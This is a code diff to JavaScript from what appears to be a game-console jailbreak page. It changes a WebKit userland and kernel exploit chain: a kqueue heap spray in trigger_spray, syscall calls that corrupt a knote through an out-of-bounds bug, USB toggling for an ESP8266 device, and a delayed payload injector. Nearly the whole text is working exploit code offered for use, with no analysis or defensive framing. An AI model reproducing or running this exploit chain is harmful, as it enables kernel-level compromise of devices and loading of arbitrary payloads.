@@ -604,16 +604,22 @@ function injectPayload() //dynamic payload inject - stooged
 }
 
 
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 
 function run_hax() {
     userland();
     if (chain.syscall(23, 0).low != 0x0) {
        kernel();
-     //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
+       //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
     }
-  // load payload mod v2  - stooged
-  showMessage("Loading " + payloadTitle + "...");
-  setTimeout(injectPayload, 3000);
+    else
+    {
+       showMessage("Loading " + payloadTitle + "...");
+       setTimeout(injectPayload, 3000);
+    }
 }
 
 
@@ -857,10 +863,8 @@ function object_setup() {
 }
 
 
-
-var trigger_spray = function () {
+var trigger_spray =  function () {
     //Make socket <= 0xFF | -> alloc 0x800
-
 
     var NUM_KQUEUES = 0x1B0;
     var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
@@ -903,25 +907,31 @@ var trigger_spray = function () {
 
     //Trigger OOB
   
-  //ESP8266 enable usb - stooged
-  enableUSB();
-  alert("Click OK When You See The Popup Notification");
-  
-    //Trigger corrupt knote
-    {
+    //ESP8266 enable usb - stooged
+    enableUSB();
+
+    sleep(10000).then(() => {
+   
+        //Trigger corrupt knote
+        {
         for (var i = 1; i < NUM_KQUEUES; i += 2) {
             chain.fcall(window.syscalls[6], kqueues[i]);
         }
-    }
-    chain.run();
-  if (chain.syscall(23, 0).low == 0) {
-    disableUSB();
-    return;
-  }
-  disableUSB();
-  alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
-    p.write8(0, 0);
-  return;
+        }
+        chain.run();
+
+        if (chain.syscall(23, 0).low == 0) {
+            disableUSB();
+            showMessage("Loading " + payloadTitle + "...");
+            setTimeout(injectPayload, 5000);
+        }
+        else
+        {
+            disableUSB();
+            alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
+            p.write8(0, 0);
+        }
+    });
 }
 </script>
 <script>
